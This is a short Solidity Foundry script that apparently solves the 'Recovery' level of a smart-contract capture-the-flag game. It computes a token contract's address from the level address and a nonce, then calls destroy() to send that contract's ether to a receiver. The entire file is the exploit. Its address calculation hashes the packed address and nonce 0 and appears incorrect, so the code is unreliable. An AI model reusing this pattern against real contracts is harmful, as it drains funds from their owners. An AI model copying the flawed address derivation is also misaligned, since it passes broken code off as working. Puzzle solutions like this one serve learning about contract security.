// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {  SimpleToken } from "src/17_Recovery/Recovery.sol";

contract RecoveryScript is Script {

    address levelAddress = 0xa0A4098F638c6Cbd85bE2dbB05AdA719bc13072E;
    SimpleToken token;


    function setUp() public {
        uint256 nonce = 0;
        address tokenAddress = address(uint(keccak256(abi.encodePacked(levelAddress, nonce))));
        token = SimpleToken(payable(tokenAddress));
    }

    function run() public {
        address payable receiver = payable(address(12345));
        uint256 balanceBefore = receiver.balance;
        vm.startBroadcast();
        token.destroy(receiver);
        uint256 receivedAmount = receiver.balance - balanceBefore;
        assert(receivedAmount > 0);
        vm.stopBroadcast();
    }

}
